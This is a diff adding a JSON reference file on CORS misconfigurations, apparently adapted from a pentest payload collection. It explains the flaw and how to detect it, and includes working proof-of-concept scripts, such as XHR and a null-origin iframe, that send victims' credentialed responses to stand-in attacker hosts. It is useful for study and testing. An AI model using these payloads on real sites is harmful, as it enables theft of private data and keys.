@@ -1,0 +1,111 @@
+{
+  "category": "CORS Misconfiguration",
+  "source": "PayloadsAllTheThings/CORS Misconfiguration/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What is a CORS Misconfiguration",
+      "language": "text",
+      "tags": ["methodology", "cors"],
+      "body": "CORS (Cross-Origin Resource Sharing) is a mechanism that allows the browser to read responses of cross-origin requests. Which origin is allowed to read the response is decided by the server itself via the Access-Control-Allow-Origin (ACAO) header.\n\nThe vulnerability arises when the server site-wide trusts the request origin: it does not validate the Origin header and at the same time returns Access-Control-Allow-Credentials: true. Then the attacker's site can send cross-origin requests on the victim's behalf, using their cookies/credentials, and read the response - for example, private data or API keys."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Exploitation conditions (what must line up)",
+      "language": "http",
+      "tags": ["methodology", "detection", "acao", "acac"],
+      "body": "The attacker's request (Burp) adds its own Origin:\n\n    Origin: https://evil.com\n\nThe victim's response is vulnerable if at the same time:\n\n    Access-Control-Allow-Credentials: true\n    Access-Control-Allow-Origin: https://evil.com   ← our Origin reflected\n      OR\n    Access-Control-Allow-Origin: null               ← null allowed\n\nKey: ACAO reflects an arbitrary/null Origin + ACAC=true. With wildcard `*` the browser does NOT send cookies (see the Wildcard section)."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "How to detect - send an Origin and watch ACAO/ACAC",
+      "language": "text",
+      "tags": ["methodology", "detection"],
+      "body": "Algorithm:\n1. Find an endpoint that returns sensitive data (most often an API domain).\n2. Insert your own header Origin: https://evil.com into the request.\n3. Look at the response headers:\n   • ACAO repeats your Origin (or = null) → the server does not whitelist the origin.\n   • ACAC: true → the response can be read with the victim's credentials.\n4. If both line up → confirm the PoC: steal the response via fetch/XHR with withCredentials=true.\n\nTry different Origin values: an arbitrary domain, null, a trusted subdomain/prefix/suffix - whichever one gets reflected."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Tools for finding CORS misconfigs",
+      "language": "text",
+      "tags": ["methodology", "tools"],
+      "body": "• s0md3v/Corsy - CORS Misconfiguration Scanner.\n• chenjj/CORScanner - a fast scanner for CORS configuration vulnerabilities.\n• @honoki/PostMessage (tools.honoki.net/postmessage.html) - POC Builder.\n• trufflesecurity/of-cors - exploitation of CORS misconfigs in internal networks.\n• omranisecurity/CorsOne - fast discovery of CORS Misconfiguration."
+    },
+    {
+      "subcategory": "Origin reflection",
+      "title": "Vulnerable response - reflection of an arbitrary Origin",
+      "language": "http",
+      "tags": ["origin-reflection", "acao", "acac"],
+      "body": "GET /endpoint HTTP/1.1\nHost: victim.example.com\nOrigin: https://evil.com\nCookie: sessionid=... \n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://evil.com\nAccess-Control-Allow-Credentials: true \n\n{\"[private API key]\"}"
+    },
+    {
+      "subcategory": "Origin reflection",
+      "title": "PoC - stealing the response via XHR (hosted on evil.com)",
+      "language": "javascript",
+      "tags": ["origin-reflection", "exploit", "xhr"],
+      "body": "var req = new XMLHttpRequest(); \nreq.onload = reqListener; \nreq.open('get','https://victim.example.com/endpoint',true); \nreq.withCredentials = true;\nreq.send();\n\nfunction reqListener() {\n    location='//attacker.net/log?key='+this.responseText; \n};"
+    },
+    {
+      "subcategory": "Origin reflection",
+      "title": "PoC - HTML page with an Exploit button",
+      "language": "html",
+      "tags": ["origin-reflection", "exploit", "html"],
+      "body": "<html>\n     <body>\n         <h2>CORS PoC</h2>\n         <div id=\"demo\">\n             <button type=\"button\" onclick=\"cors()\">Exploit</button>\n         </div>\n         <script>\n             function cors() {\n             var xhr = new XMLHttpRequest();\n             xhr.onreadystatechange = function() {\n                 if (this.readyState == 4 && this.status == 200) {\n                 document.getElementById(\"demo\").innerHTML = alert(this.responseText);\n                 }\n             };\n              xhr.open(\"GET\",\n                       \"https://victim.example.com/endpoint\", true);\n             xhr.withCredentials = true;\n             xhr.send();\n             }\n         </script>\n     </body>\n </html>"
+    },
+    {
+      "subcategory": "Null Origin",
+      "title": "Vulnerable response - null Origin allowed",
+      "language": "http",
+      "tags": ["null-origin", "acao", "acac"],
+      "body": "Sometimes the server does not reflect the whole Origin, but allows the null origin. In the response it looks like this:\n\nGET /endpoint HTTP/1.1\nHost: victim.example.com\nOrigin: null\nCookie: sessionid=... \n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true \n\n{\"[private API key]\"}"
+    },
+    {
+      "subcategory": "Null Origin",
+      "title": "PoC - sandboxed iframe + data: URI (yields Origin null)",
+      "language": "html",
+      "tags": ["null-origin", "exploit", "iframe", "data-uri"],
+      "body": "Exploited via attacker code in an iframe with the data: scheme - with it the browser sends the request with the null origin:\n\n<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html, <script>\n  var req = new XMLHttpRequest();\n  req.onload = reqListener;\n  req.open('get','https://victim.example.com/endpoint',true);\n  req.withCredentials = true;\n  req.send();\n\n  function reqListener() {\n    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);\n   };\n</script>\"></iframe> "
+    },
+    {
+      "subcategory": "XSS on a trusted origin",
+      "title": "XSS on a whitelisted domain → launch a CORS payload",
+      "language": "http",
+      "tags": ["trusted-origin", "xss", "whitelist-bypass"],
+      "body": "If the application implements a strict whitelist of allowed origins, the payloads above will not work. But if there is an XSS on a trusted (whitelisted) origin, you can inject the CORS exploit there and carry out the attack again - the request will now originate from a trusted Origin:\n\nhttps://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>"
+    },
+    {
+      "subcategory": "Wildcard without credentials",
+      "title": "Wildcard * - no cookies, but readable without authentication",
+      "language": "text",
+      "tags": ["wildcard", "internal-pivot"],
+      "body": "If the server responds with the wildcard origin `*`, the browser NEVER sends cookies. However, if the server does not require authentication, the data is still accessible. This happens on internal servers that are not reachable from the internet: the attacker's site can \"pivot\" into the internal network and read the server's data without authentication.\n\nOnly the wildcard symbol itself is allowed:\n\n    * is the only wildcard origin\n    https://*.example.com is not valid"
+    },
+    {
+      "subcategory": "Wildcard without credentials",
+      "title": "Vulnerable response - ACAO: * on an internal API",
+      "language": "http",
+      "tags": ["wildcard", "internal-pivot"],
+      "body": "GET /endpoint HTTP/1.1\nHost: api.internal.example.com\nOrigin: https://evil.com\n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\n\n{\"[private API key]\"}"
+    },
+    {
+      "subcategory": "Wildcard without credentials",
+      "title": "PoC - reading an internal API without credentials",
+      "language": "javascript",
+      "tags": ["wildcard", "internal-pivot", "exploit"],
+      "body": "var req = new XMLHttpRequest(); \nreq.onload = reqListener; \nreq.open('get','https://api.internal.example.com/endpoint',true); \nreq.send();\n\nfunction reqListener() {\n    location='//attacker.net/log?key='+this.responseText; \n};"
+    },
+    {
+      "subcategory": "Origin extension (regex bugs)",
+      "title": "Trusted prefix - any prefix before example.com passes",
+      "language": "http",
+      "tags": ["regex-bypass", "prefix", "origin-reflection"],
+      "body": "Sometimes extensions of the original origin are not filtered on the server because of a poorly written regex. In this scenario any prefix before example.com is accepted by the server - that is, an Origin of the form https://evilexample.com is reflected back:\n\nGET /endpoint HTTP/1.1\nHost: api.example.com\nOrigin: https://evilexample.com\n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://evilexample.com\nAccess-Control-Allow-Credentials: true \n\n{\"[private API key]\"}\n\nThe PoC is hosted on evilexample.com (the same XHR with withCredentials=true)."
+    },
+    {
+      "subcategory": "Origin extension (regex bugs)",
+      "title": "Unescaped dot in the regex - any letter instead of the dot",
+      "language": "http",
+      "tags": ["regex-bypass", "unescaped-dot", "origin-reflection"],
+      "body": "The server uses a regex where the dot is not escaped: for example `^api.example.com$` instead of `^api\\.example.com$`. Then the dot can be replaced with any letter and you gain access from a third-party domain - the Origin https://apiiexample.com passes the check:\n\nGET /endpoint HTTP/1.1\nHost: api.example.com\nOrigin: https://apiiexample.com\n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://apiiexample.com\nAccess-Control-Allow-Credentials: true \n\n{\"[private API key]\"}\n\nThe PoC is hosted on apiiexample.com (the same XHR with withCredentials=true)."
+    }
+  ]
+}
